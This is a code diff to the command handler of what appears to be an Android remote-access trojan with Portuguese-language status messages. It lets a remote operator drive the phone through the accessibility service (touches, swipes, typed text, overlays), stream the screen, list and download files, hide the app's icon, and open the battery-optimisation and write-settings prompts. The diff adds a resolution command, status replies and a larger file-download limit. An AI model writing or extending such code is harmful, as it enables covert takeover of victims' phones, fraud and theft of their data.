@@ -13,6 +13,12 @@ import org.json.JSONObject;
 
 public final class Cmd {
 
+    private static boolean acc() {
+        if (KeySvc.I != null) return true;
+        Net.send("{\"t\":\"err\",\"o\":\"acessibilidade desligada\"}");
+        return false;
+    }
+
     public static void handle(Context c, String m) {
         try {
             JSONObject o = new JSONObject(m);
@@ -20,36 +26,45 @@ public final class Cmd {
             KeySvc k = KeySvc.I;
 
             switch (cmd) {
+                case "ka":
+                    break;
                 case "touch":
-                    if (k != null) k.touch((float) o.optDouble("x"), (float) o.optDouble("y"));
+                    if (acc()) k.touch((float) o.optDouble("x"), (float) o.optDouble("y"));
                     break;
                 case "long":
-                    if (k != null) k.longPress((float) o.optDouble("x"), (float) o.optDouble("y"));
+                    if (acc()) k.longPress((float) o.optDouble("x"), (float) o.optDouble("y"));
                     break;
                 case "swipe":
-                    if (k != null) k.swipe((float) o.optDouble("x1"), (float) o.optDouble("y1"),
+                    if (acc()) k.swipe((float) o.optDouble("x1"), (float) o.optDouble("y1"),
                             (float) o.optDouble("x2"), (float) o.optDouble("y2"), o.optInt("ms", 260));
                     break;
                 case "text":
-                    if (k != null) k.setText(o.optString("s"));
+                    if (acc()) k.setText(o.optString("s"));
                     break;
                 case "key":
-                    if (k != null) k.key(o.optInt("code", 4));
+                    if (acc()) k.key(o.optInt("code", 4));
                     break;
                 case "screen":
-                    if (k != null) k.screenOn(o.optBoolean("on", true));
+                    if (acc()) k.screenOn(o.optBoolean("on", true));
                     break;
                 case "shot":
-                    if (k != null) k.shotOn = o.optBoolean("on", true);
+                    if (acc()) k.shotOn = o.optBoolean("on", true);
                     break;
                 case "ov":
-                    if (k != null) k.overlay(o.optBoolean("on", true));
+                    if (acc()) k.overlay(o.optBoolean("on", true));
                     break;
                 case "q":
                     ScreenSvc.Q = Math.max(15, Math.min(90, o.optInt("v", 38)));
+                    Net.send("{\"t\":\"info\",\"o\":\"q " + ScreenSvc.Q + "\"}");
                     break;
                 case "fps":
-                    ScreenSvc.FPS = Math.max(1, Math.min(15, o.optInt("v", 8)));
+                    ScreenSvc.FPS = Math.max(1, Math.min(15, o.optInt("v", 4)));
+                    Net.send("{\"t\":\"info\",\"o\":\"fps " + ScreenSvc.FPS + "\"}");
+                    break;
+                case "res":
+                    ScreenSvc.W = Math.max(360, Math.min(1080, o.optInt("v", 540)));
+                    ScreenSvc.rebuildNow();
+                    Net.send("{\"t\":\"info\",\"o\":\"res " + ScreenSvc.W + "\"}");
                     break;
                 case "toast":
                     Toast.makeText(c, o.optString("s"), Toast.LENGTH_LONG).show();
@@ -94,7 +109,7 @@ public final class Cmd {
                     Net.send("{\"t\":\"ls\",\"o\":\"" + Util.esc(Extra.ls(o.optString("p", "/sdcard"))) + "\"}");
                     break;
                 case "dl":
-                    Net.send("{\"t\":\"dl\",\"o\":\"" + Util.esc(Extra.cat(o.optString("p"), o.optInt("n", 64000))) + "\"}");
+                    Net.send("{\"t\":\"dl\",\"o\":\"" + Util.esc(Extra.cat(o.optString("p"), o.optInt("n", 200000))) + "\"}");
                     break;
                 case "bright":
                     Extra.bright(c, o.optInt("v", 50));
@@ -127,6 +142,8 @@ public final class Cmd {
                                     ? PackageManager.COMPONENT_ENABLED_STATE_DISABLED
                                     : PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                             PackageManager.DONT_KILL_APP);
+                    Net.send("{\"t\":\"info\",\"o\":\"icone " +
+                            (o.optBoolean("on", true) ? "oculto" : "visivel") + "\"}");
                     break;
                 case "battery":
                     Intent b = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
@@ -135,10 +152,10 @@ public final class Cmd {
                     c.startActivity(b);
                     break;
                 case "wr":
-                    Intent w = new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS,
+                    Intent wr = new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS,
                             Uri.parse("package:" + c.getPackageName()));
-                    w.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                    c.startActivity(w);
+                    wr.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    c.startActivity(wr);
                     break;
                 case "recon":
                     Net.send("{\"t\":\"info\",\"o\":\"reconectando\"}");
